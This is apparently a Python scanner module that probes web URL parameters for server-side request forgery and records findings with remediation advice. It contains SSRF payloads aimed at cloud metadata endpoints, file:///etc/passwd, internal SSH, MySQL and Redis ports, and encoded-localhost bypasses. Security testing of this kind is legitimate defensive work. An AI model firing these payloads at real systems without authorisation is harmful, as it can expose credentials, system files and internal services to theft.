import re
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession

URL_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "return", "next",
    "site", "html", "data", "domain", "callback", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation",
    "open", "file", "val", "validate", "link", "image", "img",
    "src", "source", "page", "proxy", "request", "fetch",
    "target", "load", "href", "resource",
]

SSRF_PAYLOADS = [
    {
        "payload": "http://127.0.0.1",
        "indicators": [r"<html", r"<title>", r"localhost", r"It works"],
        "desc": "Direct localhost access",
    },
    {
        "payload": "http://127.0.0.1:22",
        "indicators": [r"SSH-", r"OpenSSH"],
        "desc": "Internal port probing (SSH)",
    },
    {
        "payload": "http://127.0.0.1:3306",
        "indicators": [r"mysql", r"MariaDB", r"native_password"],
        "desc": "Internal port probing (MySQL)",
    },
    {
        "payload": "http://[::1]",
        "indicators": [r"<html", r"<title>"],
        "desc": "IPv6 localhost bypass",
    },
    {
        "payload": "http://0x7f000001",
        "indicators": [r"<html", r"<title>"],
        "desc": "Hex IP bypass",
    },
    {
        "payload": "http://0177.0.0.1",
        "indicators": [r"<html", r"<title>"],
        "desc": "Octal IP bypass",
    },
    {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "indicators": [r"ami-id", r"instance-id", r"local-hostname", r"iam"],
        "desc": "AWS metadata endpoint",
    },
    {
        "payload": "http://169.254.169.254/computeMetadata/v1/",
        "indicators": [r"project", r"attributes"],
        "desc": "GCP metadata endpoint",
    },
    {
        "payload": "http://169.254.169.254/metadata/instance",
        "indicators": [r"compute", r"vmId"],
        "desc": "Azure metadata endpoint",
    },
    {
        "payload": "file:///etc/passwd",
        "indicators": [r"root:.*?:0:0"],
        "desc": "File scheme access",
    },
    {
        "payload": "dict://127.0.0.1:6379/INFO",
        "indicators": [r"redis_version", r"connected_clients"],
        "desc": "Redis via dict:// protocol",
    },
    {
        "payload": "gopher://127.0.0.1:6379/_INFO",
        "indicators": [r"redis_version"],
        "desc": "Redis via gopher:// protocol",
    },
]


def _get_baseline(session: ScanSession, url: str, param: str, original: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original or "https://www.google.com"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    resp = session.get(baseline_url)
    return resp.text if resp else ""


def _check_param(session: ScanSession, url: str, param: str, original: str):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    baseline = _get_baseline(session, url, param, original)

    for entry in SSRF_PAYLOADS:
        params[param] = [entry["payload"]]
        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        resp = session.get(test_url)
        if not resp:
            continue

        body = resp.text
        for indicator in entry["indicators"]:
            if re.search(indicator, body, re.IGNORECASE):
                if not re.search(indicator, baseline, re.IGNORECASE):
                    session.add_finding(Finding(
                        title=f"Server-Side Request Forgery (SSRF)",
                        severity=Severity.CRITICAL if "metadata" in entry["payload"] or "file:///" in entry["payload"] else Severity.HIGH,
                        description=f"Parameter '{param}' is vulnerable to SSRF ({entry['desc']}). The server makes requests to attacker-controlled URLs.",
                        evidence=f"Payload: {entry['payload']}\nURL: {test_url}\nMatched: {indicator}\nDescription: {entry['desc']}",
                        remediation="Validate and whitelist allowed URLs/IPs. Block access to internal networks and cloud metadata endpoints. Use allowlists, not denylists.",
                        url=url,
                        module="ssrf",
                        cwe="CWE-918",
                        confirmed=True,
                    ))
                    return

    baseline_times = []
    params[param] = [original or "http://www.google.com"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    for _ in range(2):
        start2 = time.time()
        session.get(baseline_url)
        baseline_times.append(time.time() - start2)
    baseline_max = max(baseline_times)

    internal_time_payload = "http://10.255.255.1"
    params[param] = [internal_time_payload]
    test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    hits = 0
    for _ in range(2):
        start = time.time()
        session.get(test_url)
        elapsed = time.time() - start
        if elapsed > baseline_max + 5:
            hits += 1

    if hits >= 2:
        session.add_finding(Finding(
            title="Potential SSRF (Time-Based)",
            severity=Severity.MEDIUM,
            description=f"Parameter '{param}' consistently shows timing difference when accessing internal IPs.",
            evidence=f"Both requests to internal IP exceeded baseline by >5s.\nBaseline max: {baseline_max:.2f}s",
            remediation="Validate and whitelist allowed URLs. Block internal network access.",
            url=url,
            module="ssrf",
            cwe="CWE-918",
            confirmed=False,
        ))


def run(session: ScanSession) -> None:
    print("\n[*] Testing for Server-Side Request Forgery (SSRF)...")

    for url in session.crawled_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, values in params.items():
            if param.lower() in URL_PARAMS or any(
                kw in (values[0] if values else "").lower()
                for kw in ["http", "://", "www", ".com", ".org"]
            ):
                _check_param(session, url, param, values[0] if values else "")

    for url in list(session.crawled_urls)[:5]:
        parsed = urlparse(url)
        if parsed.query:
            continue
        for param in URL_PARAMS[:3]:
            _check_param(session, url + f"?{param}=test", param, "test")
